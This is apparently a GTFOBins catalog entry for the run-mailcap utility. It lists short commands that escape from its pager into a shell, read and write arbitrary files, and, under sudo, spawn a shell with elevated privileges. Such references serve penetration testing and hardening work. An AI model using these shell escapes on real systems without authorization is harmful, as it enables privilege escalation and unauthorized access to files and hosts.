---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        run-mailcap --action=view /etc/hosts
        !/bin/sh
  file-read:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: run-mailcap --action=view file_to_read
  file-write:
    - description: |
        The file must exist and be not empty.

        This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.
      code: run-mailcap --action=edit file_to_read
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo run-mailcap --action=view /etc/hosts
        !/bin/sh
---
